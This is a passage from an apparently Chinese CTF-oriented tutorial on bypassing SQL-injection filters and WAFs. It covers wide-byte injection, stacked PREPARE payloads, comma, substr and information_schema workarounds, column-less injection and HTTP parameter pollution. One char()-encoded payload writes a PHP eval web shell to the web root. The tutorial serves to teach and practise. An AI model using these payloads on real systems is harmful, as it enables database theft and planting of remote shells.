strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>以上脚本都要注意是掌握编写思路，不是干抄脚本。</p>
<h4 id="过滤引号绕过"><a href="#过滤引号绕过" class="headerlink" title="过滤引号绕过"></a>过滤引号绕过</h4><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><h6 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h6><p><strong>magic_quotes_gpc</strong> （魔术引号开关）</p>
<p><code>magic_quotes_gpc</code>函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p>
<p>单引号（’）、双引号（”）、反斜线（\）等字符都会被加上反斜线，我们输入的东西如果不能闭合，那我们的输入就不会当作代码执行，就无法产生SQL注入。</p>
<p><strong>addslashes()函数</strong></p>
<p>返回在预定义字符之前添加反斜杠的字符串</p>
<blockquote>
<p>预定义字符：单引号（’），双引号（”），反斜杠（\），NULL</p>
</blockquote>
<h6 id="宽字节概念："><a href="#宽字节概念：" class="headerlink" title="宽字节概念："></a>宽字节概念：</h6><ol>
<li>单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)</li>
<li>多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</li>
<li>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</li>
<li>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。</li>
<li>宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字</li>
</ol>
<h6 id="成因与示例"><a href="#成因与示例" class="headerlink" title="成因与示例"></a>成因与示例</h6><p>前面讲到了GBK编码格式。GBK是双字符编码，那么为什么他们会和渗透测试发送了“巧遇”呢？</p>
<p><strong>宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入。</strong></p>
<p>例如说MySql的编码设置为了SET NAMES ‘gbk’或是 SET character_set_client &#x3D;gbk，这样配置会引发编码转换从而导致的注入漏洞。</p>
<p><strong>宽字节SQL注入的根本原因:</strong></p>
<p><strong>宽字节SQL注入就是PHP发送请求到MySql时使用了语句</strong></p>
<p><strong>SET NAMES ‘gbk’ 或是SET character_set_client &#x3D;gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。</strong></p>
<p><strong>magic_quotes_gpc的作用：当PHP的传参中有特殊字符就会在前面加转义字符’&#39;,来做一定的过滤</strong></p>
<p>为了绕过magic_quotes_gpc的,于是乎我们开始导入宽字节的概念</p>
<p>我们发现\的编码是%5c，然后我们会想到传参一个字符想办法凑成一个gbk字符,例如：‘運’字是%df%5c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1\&#x27;&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>这条语句因为\使我们无法去注入，那么我们是不是可以用%df吃到%5c,因为如果用GBK编码的话这个就是運，然后成功绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1�\&#x27;#&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<h6 id="虽然是写在了过滤引号的位置但是其实不止适用于过滤引号"><a href="#虽然是写在了过滤引号的位置但是其实不止适用于过滤引号" class="headerlink" title="虽然是写在了过滤引号的位置但是其实不止适用于过滤引号"></a>虽然是写在了过滤引号的位置但是其实不止适用于过滤引号</h6><h5 id="使用反斜杠-逃逸-Sql-语句"><a href="#使用反斜杠-逃逸-Sql-语句" class="headerlink" title="使用反斜杠 \ 逃逸 Sql 语句"></a>使用反斜杠 \ 逃逸 Sql 语句</h5><p>如果没有过滤反斜杠的话，我们可以使用反斜杠将后面的引号转义，从而逃逸后面的 Sql 语句。</p>
<p>假设sql语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username, password from users where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>

<p>假设输入的用户名是 <code>admin\</code>，密码输入的是 <code>or 1#</code> 整个SQL语句变成了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from users where username=&#x27;admin\&#x27; and password=&#x27; or 1#&#x27;</span><br></pre></td></tr></table></figure>

<p>由于单引号被转义，<code>and password=</code>这部分都成了username的一部分，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27;admin\&#x27; and password=&#x27;</span><br></pre></td></tr></table></figure>

<p>这样 <code>or 1</code> 就逃逸出来了，由此可控，可作为注入点了。</p>
<h4 id="堆叠注入时利用-MySql-预处理"><a href="#堆叠注入时利用-MySql-预处理" class="headerlink" title="堆叠注入时利用 MySql 预处理"></a>堆叠注入时利用 MySql 预处理</h4><p>在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用<strong>MySql预处理语句配合concat拼接</strong>来执行sql语句拿flag。</p>
<ol>
<li>PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(<code>hello</code>)供之后调用</li>
<li>EXECUTE：执行命令</li>
<li>DEALLOCATE PREPARE：释放命令</li>
<li>SET：用于设置变量(<code>@a</code>)</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;sEt @a=concat(&quot;sel&quot;,&quot;ect flag from flag_here&quot;);PRepare hello from @a;execute hello;#</span><br></pre></td></tr></table></figure>

<p>这里还用大小写简单绕了一下其他过滤</p>
<h5 id="MySql-预处理配合十六进制绕过关键字"><a href="#MySql-预处理配合十六进制绕过关键字" class="headerlink" title="MySql 预处理配合十六进制绕过关键字"></a>MySql 预处理配合十六进制绕过关键字</h5><p>基本原理如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(&#x27;show databases&#x27;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| hex(&#x27;show databases;&#x27;)       |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 73686F7720646174616261736573 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set @b=0x73686F7720646174616261736573;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; prepare test from @b;</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql&gt; execute test;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| challenges         |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| security           |</span><br><span class="line">| test               |</span><br><span class="line">+--------------------+</span><br><span class="line">6 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure>

<p>即payload类似如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#</span><br></pre></td></tr></table></figure>

<h5 id="MySql预处理配合字符串拼接绕过关键字"><a href="#MySql预处理配合字符串拼接绕过关键字" class="headerlink" title="MySql预处理配合字符串拼接绕过关键字"></a>MySql预处理配合字符串拼接绕过关键字</h5><p>原理就是借助<code>char()</code>函数将ascii码转化为字符然后再使用<code>concat()</code>函数将字符连接起来，有了前面的基础这里应该很好理解了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure>

<p>也可以不用concat函数，直接用char函数也具有连接功能：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure>

<h4 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h4><p>当逗号被过滤了之后，我们便不能向下面这样正常的时候substr()函数和limit语句了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr((select database()),1,1);</span><br><span class="line">select * from users limit 0,1;</span><br></pre></td></tr></table></figure>

<h5 id="使用from…for…绕过"><a href="#使用from…for…绕过" class="headerlink" title="使用from…for…绕过"></a>使用from…for…绕过</h5><p>我们可以使用 <code>from...for..</code> 语句替换 substr() 函数里的 <code>,1,1</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">select substr((select database()) from 1 for 1);</span><br><span class="line"># 此时 from 1 for 1 中的两个1分别代替 substr() 函数里的两个1</span><br><span class="line"></span><br><span class="line">select substr((select database()) from 1 for 1);    # s</span><br><span class="line">select substr((select database()) from 2 for 1);    # e</span><br><span class="line">select substr((select database()) from 3 for 1);    # c</span><br><span class="line">select substr((select database()) from 4 for 1);    # u</span><br><span class="line">select substr((select database()) from 5 for 1);    # r</span><br><span class="line">select substr((select database()) from 6 for 1);    # i</span><br><span class="line">select substr((select database()) from 7 for 1);    # t</span><br><span class="line">select substr((select database()) from 8 for 1);    # y</span><br><span class="line"></span><br><span class="line"># 如果过滤了空格, 则可以使用括号来代替空格:</span><br><span class="line">select substr((select database())from(1)for(1));    # s</span><br><span class="line">select substr((select database())from(2)for(1));    # e</span><br><span class="line">select substr((select database())from(3)for(1));    # c</span><br><span class="line">select substr((select database())from(4)for(1));    # u</span><br><span class="line">select substr((select database())from(5)for(1));    # r</span><br><span class="line">select substr((select database())from(6)for(1));    # i</span><br><span class="line">select substr((select database())from(7)for(1));    # t</span><br><span class="line">select substr((select database())from(8)for(1));    # y</span><br></pre></td></tr></table></figure>

<p>即，from用来指定从何处开始截取，for用来指定截取的长度，如果不加for的话则 <code>from 1</code> 就相当于从字符串的第一位一直截取到最后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">select substr((select database()) from 1);    # security</span><br><span class="line">select substr((select database()) from 2);    # ecurity</span><br><span class="line">select substr((select database()) from 3);    # curity</span><br><span class="line">select substr((select database()) from 4);    # urity</span><br><span class="line">select substr((select database()) from 5);    # rity</span><br><span class="line">select substr((select database()) from 6);    # ity</span><br><span class="line">select substr((select database()) from 7);    # ty</span><br><span class="line">select substr((select database()) from 8);    # y</span><br><span class="line"></span><br><span class="line"># 也可以使用负数来倒着截取:</span><br><span class="line">select substr((select database())from(-1));    # y</span><br><span class="line">select substr((select database())from(-2));    # ty</span><br><span class="line">select substr((select database())from(-3));    # ity</span><br><span class="line">select substr((select database())from(-4));    # rity</span><br><span class="line">select substr((select database())from(-5));    # urity</span><br><span class="line">select substr((select database())from(-6));    # curity</span><br><span class="line">select substr((select database())from(-7));    # ecurity</span><br><span class="line">select substr((select database())from(-8));    # security</span><br></pre></td></tr></table></figure>

<h5 id="使用offset关键字绕过"><a href="#使用offset关键字绕过" class="headerlink" title="使用offset关键字绕过"></a>使用offset关键字绕过</h5><p>我们可以使用 <code>offset</code> 语句替换 limit 语句里的逗号：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users limit 1 offset 2;</span><br><span class="line"># 此时 limit 1 offset 2 可以代替 limit 1,2</span><br></pre></td></tr></table></figure>

<h5 id="利用join与别名绕过"><a href="#利用join与别名绕过" class="headerlink" title="利用join与别名绕过"></a>利用join与别名绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host,user from user where user=&#x27;a&#x27;union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`=&#x27;mysql&#x27;)`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`=&#x27;mysql&#x27;)b));</span><br></pre></td></tr></table></figure>

<h4 id="过滤information-schema绕过与无列名注入"><a href="#过滤information-schema绕过与无列名注入" class="headerlink" title="过滤information_schema绕过与无列名注入 *"></a>过滤information_schema绕过与无列名注入 *</h4><p>当过滤or时，这个库就会被过滤，那么mysql在被waf禁掉了information_schema库后还能有哪些利用思路呢？</p>
<p>information_schema 简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。在注入中，infromation_schema库的作用无非就是可以获取到table_schema、table_name、column_name这些数据库内的信息。</p>
<p>能够代替information_schema的有：</p>
<ul>
<li><p>sys.schema_auto_increment_columns 只显示有自增的表</p>
</li>
<li><p>sys.schema_table_statistics_with_buffer</p>
</li>
<li><p>x$schema_table_statistics_with_buffer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();</span><br></pre></td></tr></table></figure>
</li>
<li><p>mysql.innodb_table_stats</p>
</li>
<li><p>mysql.innodb_table_index</p>
</li>
</ul>
<p>以上大部分特殊数据库都是在 mysql5.7 以后的版本才有，并且要访问sys数据库需要有相应的权限。</p>
<p>但是在使用上面的后两个表来获取表名之后<code>select group_concat(table_name) from mysql.innodb_table_stats</code>，我们是没有办法获得列的，这个时候就要采用无列名注入的办法。</p>
<h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><h5 id="123法"><a href="#123法" class="headerlink" title="123法"></a>123法</h5><p>我们可以利用一些查询上的技巧来进行无列名、表名的注入。</p>
<p>在我们直接<code>select 1,2,3</code>时，会创建一个虚拟的表</p>
<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102451-qfyyn3w.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102451-qfyyn3w.png" alt="img"></a></p>
<p>如图所见列名会被定义为1，2，3</p>
<p>当我们结合了union联合查询之后</p>
<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102627-aucxfpc.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102627-aucxfpc.png" alt="img"></a></p>
<p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password，进而我们就可以构造这样的查询语句来查询password：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from users)a;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102802-651hm3o.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102802-651hm3o.png" alt="img"></a></p>
<p>末尾的 a 可以是任意字符，用于命名</p>
<p>当然，多数情况下，反引号会被过滤。当反引号不能使用的时候，可以使用别名来代替：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure>

<h5 id="join"><a href="#join" class="headerlink" title="join"></a>join</h5><p>我们可以利用爆错，借助join和using爆出列名，id为第一列，username为第二列，可以逐个爆出，爆出全部列名之后即可得到列内数据。</p>
<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129140931-xh6qnfj.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129140931-xh6qnfj.png" alt="img"></a></p>
<h4 id="过滤其他关键字绕过"><a href="#过滤其他关键字绕过" class="headerlink" title="过滤其他关键字绕过"></a>过滤其他关键字绕过</h4><h5 id="过滤-if-语句绕过"><a href="#过滤-if-语句绕过" class="headerlink" title="过滤 if 语句绕过"></a>过滤 if 语句绕过</h5><p>如果过滤了 if 关键字的话，我们可以使用case when语句绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(condition,1,0) &lt;=&gt; case when condition then 1 else 0 end</span><br></pre></td></tr></table></figure>

<p>下面的if语句和case when语句是等效的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#</span><br><span class="line"></span><br><span class="line">0&#x27; or case when ascii(substr((select database()),1,1))&gt;97 then 1 else 0 end#</span><br></pre></td></tr></table></figure>

<h4 id="过滤-substr-绕过"><a href="#过滤-substr-绕过" class="headerlink" title="过滤 substr 绕过"></a>过滤 substr 绕过</h4><h5 id="使用-lpad-lpad"><a href="#使用-lpad-lpad" class="headerlink" title="使用 lpad&#x2F;lpad"></a>使用 lpad&#x2F;lpad</h5><ul>
<li>使用lpad()和rpad()绕过substr()</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">select lpad((select database()),1,1)    // s</span><br><span class="line">select lpad((select database()),2,1)    // se</span><br><span class="line">select lpad((select database()),3,1)    // sec</span><br><span class="line">select lpad((select database()),4,1)    // secu</span><br><span class="line">select lpad((select database()),5,1)    // secur</span><br><span class="line">select lpad((select database()),6,1)    // securi</span><br><span class="line">select lpad((select database()),7,1)    // securit</span><br><span class="line">select lpad((select database()),8,1)    // security</span><br><span class="line"></span><br><span class="line">select rpad((select database()),1,1)    // s</span><br><span class="line">select rpad((select database()),2,1)    // se</span><br><span class="line">select rpad((select database()),3,1)    // sec</span><br><span class="line">select rpad((select database()),4,1)    // secu</span><br><span class="line">select rpad((select database()),5,1)    // secur</span><br><span class="line">select rpad((select database()),6,1)    // securi</span><br><span class="line">select rpad((select database()),7,1)    // securit</span><br><span class="line">select rpad((select database()),8,1)    // security</span><br></pre></td></tr></table></figure>

<p>lpad：函数语法：<code>lpad(str1,length,str2)</code>。其中str1是第一个字符串，length是结果字符串的长度，str2是一个填充字符串。如果str1的长度没有length那么长，则使用str2填充；如果str1的长度大于length，则截断。</p>
<p>rpad：同理</p>
<ul>
<li>使用left()绕过substr()</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select left((select database()),1)    // s</span><br><span class="line">select left((select database()),2)    // se</span><br><span class="line">select left((select database()),3)    // sec</span><br><span class="line">select left((select database()),4)    // secu</span><br><span class="line">select left((select database()),5)    // secur</span><br><span class="line">select left((select database()),6)    // securi</span><br><span class="line">select left((select database()),7)    // securit</span><br><span class="line">select left((select database()),8)    // security</span><br></pre></td></tr></table></figure>

<ul>
<li>使用mid()绕过substr()</li>
</ul>
<p>mid()函数的使用就和substr()函数一样了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select mid((select database()),1,1)    // s</span><br><span class="line">select mid((select database()),2,1)    // e</span><br><span class="line">select mid((select database()),3,1)    // c</span><br><span class="line">select mid((select database()),4,1)    // u</span><br><span class="line">select mid((select database()),5,1)    // r</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<ul>
<li>还可以使用下面这个神奇的东西绕过</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select insert(insert((select database()),1,0,space(0)),2,222,space(0));    // s</span><br><span class="line">select insert(insert((select database()),1,1,space(0)),2,222,space(0));    // e</span><br><span class="line">select insert(insert((select database()),1,2,space(0)),2,222,space(0));    // c</span><br><span class="line">select insert(insert((select database()),1,3,space(0)),2,222,space(0));    // u</span><br><span class="line">select insert(insert((select database()),1,4,space(0)),2,222,space(0));    // r</span><br><span class="line">select insert(insert((select database()),1,5,space(0)),2,222,space(0));    // i</span><br><span class="line">select insert(insert((select database()),1,6,space(0)),2,222,space(0));    // t</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>INSERT( <em>string</em> , <em>position</em> , <em>number</em> , <em>string2</em> )</p>
<p>INSERT()函数在指定位置的字符串中插入一个字符串，并插入一定数量的字符。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>必须项。要修改的字符串</td>
</tr>
<tr>
<td><em>position</em></td>
<td>必须项。插入<em>string2</em>的位置</td>
</tr>
<tr>
<td><em>number</em></td>
<td>必须项。要替换的字符数</td>
</tr>
<tr>
<td><em>string2</em></td>
<td>必须项。要插入<em>字符串的字符串</em></td>
</tr>
</tbody></table>
<h4 id="HTTP参数污染-HPP-漏洞绕过-Waf"><a href="#HTTP参数污染-HPP-漏洞绕过-Waf" class="headerlink" title="HTTP参数污染(HPP)漏洞绕过 Waf"></a>HTTP参数污染(HPP)漏洞绕过 Waf</h4><p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。浏览器在跟服务器进行交互的过程中，浏览器往往会在GET或POST请求里面带上参数，这些参数会以 键-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。</p>
<p>但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<code>http://www.baidu.com?name=aa&amp;name=bb</code>，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是 <code>name=aa</code>。有的服务器是取第二个参数，也就是 <code>name=bb</code>。有的服务器两个参数都取，也就是 <code>name=aa,bb</code>。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
<p>HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同类型的Web服务器对于出现多个参数时的选择：</p>
<table>
<thead>
<tr>
<th><strong>Web 服务器</strong></th>
<th><strong>参数获取函数</strong></th>
<th><strong>获取到的参数</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>PHP&#x2F;Apache</strong></td>
<td>$_GET[‘a’]</td>
<td>Last</td>
</tr>
<tr>
<td><strong>JSP&#x2F;Tomcat</strong></td>
<td>Request.getParameter(‘a’)</td>
<td>First</td>
</tr>
<tr>
<td><strong>Perl(CGI)&#x2F;Apache</strong></td>
<td>Param(‘a’)</td>
<td>First</td>
</tr>
<tr>
<td><strong>Python&#x2F;Apache</strong></td>
<td>getvalue(‘a’)</td>
<td>All</td>
</tr>
<tr>
<td><strong>ASP&#x2F;IIS</strong></td>
<td>Request.QueryString(‘a’)</td>
<td>All</td>
</tr>
</tbody></table>
<p>假设服务器端有两个部分：第一部分是Tomcat为引擎的JSP&#x2F;Tomcat型服务器，第二部分是Apache为引擎的PHP&#x2F;Apache型服务器。第一部分的JSP&#x2F;Tomcat服务器处做数据过滤和处理，功能类似为一个WAF，而真正提供Web服务的是PHP&#x2F;Apache服务器。那么服务端的工作流程为：客户端访问服务器，能直接访问到JSP&#x2F;Tomcat服务器，然后JSP&#x2F;Tomcat服务器再向PHP&#x2F;Apache服务器请求数据。数据返回路径则相反。</p>
<p>那么此时我们便可以利用不同服务器解析参数的位置不同绕过WAF的检测。来看看如下请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.jsp?id=1&amp;id=2</span><br></pre></td></tr></table></figure>

<p>客户端请求首先过JSP&#x2F;Tomcat服务器，JSP&#x2F;Tomcat服务器解析第一个参数，接下来JSP&#x2F;Tomcat服务器去请求PHP&#x2F;Apache服务器，PHP&#x2F;Apache服务器解析最后一个参数。假设JSP&#x2F;Tomcat服务器作为Waf对第一个参数进行检测，那我们便可以在第二个参数中传payload来绕过Waf。如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.jsp?id=1&amp;id=-1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure>

<p>这样 Waf 可能只检测第一个参数 <code>id=1</code>，而PHP脚本真正识别的是 <code>id=select database()--+</code></p>
<p>[例题]Sql-Labs Less-29</p>
<h4 id="False-注入绕过"><a href="#False-注入绕过" class="headerlink" title="False 注入绕过"></a>False 注入绕过</h4><h5 id="False-注入原理"><a href="#False-注入原理" class="headerlink" title="False 注入原理"></a>False 注入原理</h5><p>前面我们学过的注入都是基于1&#x3D;1这样比较的普通注入，下面来说一说 False 注入，利用 False 我们可以绕过一些特定的 WAF 以及一些未来不确定的因素。</p>
<p>首先我们来看一看下面这个sql查询语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where uesrname = 0;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203530-sxree7q.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203530-sxree7q.png" alt="img"></a></p>
<p>为什么 <code>username = 0</code> 会导致返回数据，而且是全部数据呢？</p>
<p>这就是一个基于 False 注入的例子，下面再举一个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = 0;</span><br></pre></td></tr></table></figure>

